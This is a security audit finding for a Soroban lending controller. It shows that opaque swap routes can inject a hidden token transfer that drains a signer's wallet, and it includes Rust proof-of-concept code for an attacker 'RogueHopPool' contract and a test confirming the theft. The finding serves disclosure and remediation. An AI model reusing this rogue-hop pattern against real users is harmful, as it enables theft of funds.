### Title
Malicious swap route injects a hidden `token.transfer` from the caller's wallet beneath the caller's `swap_collateral`/`swap_debt`/`multiply` authorization tree - ([File: contracts/controller/src/strategies/swap.rs](contracts/controller/src/strategies/swap.rs))

### Summary
The external report concerns an API that silently returns all vault credentials without the prompt disclosing what is being accessed. The on-chain analog in XOXNO Lending is the strategy swap path: the controller forwards caller-supplied opaque `swap: Bytes` to the configured router, and the router invokes whatever contracts the payload names with the caller's `require_auth` tree still on the stack. A crafted route can therefore attach an arbitrary child invocation — e.g. `token.transfer(victim_wallet, attacker, full_balance)` — underneath the caller's single `swap_collateral` authorization. Nothing in the controller discloses or bounds what the route accesses; the signed arguments only show the opaque bytes. The test suite proves the wallet drain end to end.

### Finding Description
`process_swap_collateral` [1](#0-0)  calls `withdraw_and_swap_from_supply` with the caller-provided `swap` blob, which (like `swap_debt`, `multiply`, `repay_debt_with_collateral`) routes through `swap_tokens_or_passthrough` in `contracts/controller/src/strategies/swap.rs` to the configured swap aggregator's `execute_strategy`. The router decodes the payload and calls `env.invoke_contract` on arbitrary hop addresses the payload names, as demonstrated by the `UnlistedPoolRouter`/`RogueHopPool` fixtures in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` [2](#0-1) .

Because the hop runs below the controller call, a `token.transfer(caller, attacker, amount)` issued by the rogue hop is recorded by simulation as a child of the caller's `swap_collateral` auth entry and executes once signed — the test asserts exactly this and that Alice's entire `WALLET_BALANCE` (a token the protocol never listed) moves to the attacker while the swap itself returns a fair output [3](#0-2) . The threat model confirms the mechanism: the router "keeps no allowlist" of addresses, "a route can put third-party code on the call stack below the caller's authorization", and "the loss is then the caller's wallet, not the routed amount" [4](#0-3) . The user signs `swap_collateral(caller, account_id, current, amount, new, <opaque bytes>)`; the visible arguments never reveal the hidden wallet transfer, mirroring the pallad prompt that hid which credentials were accessed.

### Impact Explanation
Theft of user funds. A single malicious `swap` payload drains arbitrary token balances (unlimited amount, any token including unlisted ones) from any user who signs a strategy call, beyond the routed collateral. All four route-accepting entrypoints (`swap_collateral`, `swap_debt`, `multiply`, `repay_debt_with_collateral`) are reachable by an unprivileged attacker submitting the poisoned route to an unsuspecting user/frontend.

### Likelihood Explanation
The exploit requires social engineering — getting a victim to sign a transaction carrying an opaque `swap` blob produced by an attacker (e.g., a malicious frontend or route-quoting service). This is a realistic phishing pattern since the `swap: Bytes` is undecodable by inspection, and the controller itself places no allowlist or disclosure on route contents. The invariant `INV-STRAT-01` only bounds the controller's own granted authority, not what the route does under the caller's auth tree [5](#0-4) .

### Recommendation
- Restrict route hop targets: have the router/controller maintain a governance-approved allowlist of pool/venue contracts, or require each hop address to resolve to a registered venue.
- Alternatively, isolate caller authority: perform the hop under a sub-contract invocation context that does not carry the caller's `require_auth` tree (e.g., the controller calls the router without propagating caller auth for non-input legs), or require the router's single authorized action to be exactly the measured input transfer with no sibling invocations permitted.
- At minimum, emit an event/return listing every contract the route invoked so wallets and clients can surface the full access set before signing — the direct analog of the pallad fix that displays requested credentials in the prompt.

### Proof of Concept
1. Attacker deploys `RogueHopPool` configured with `(victim=Alice, wallet_token, to=attacker, amount=Alice's full balance)` [6](#0-5) .
2. Attacker gives Alice a `swap` blob encoding `RoutedSwap{ hop_pool: rogue, token_in: USDC, token_out: ETH, min_out: fair }` — indistinguishable from a legitimate route in the signing prompt.
3. Alice calls `controller.swap_collateral(alice, account_id, USDC_key, 50_000_000_000, ETH_key, route)`. The controller withdraws her collateral and invokes the router; the router calls `rogue.swap()`, which executes `token::transfer(alice, attacker, WALLET_BALANCE)` [7](#0-6) .
4. Simulation records the theft as a child invocation of Alice's own `swap_collateral` authorization; once she signs, the tree executes and `WALLET_BALANCE` moves to the attacker while the swap returns a fair `FAIR_OUT_ETH` — confirmed by `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` asserting `wallet(alice) == 0` and `wallet(attacker) == WALLET_BALANCE` [8](#0-7) .

    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
}

/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
}

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

### INV-STRAT-01 — Controller router authority binds one input transfer

The controller authorizes one exact
`token_in.transfer(controller, configured_router, amount_in)` invocation,
without sub-invocations. This grants invocation authority, without a token
allowance.

The controller ignores the router's return value, rejects input-balance growth
and rejects measured spending above `amount_in`.
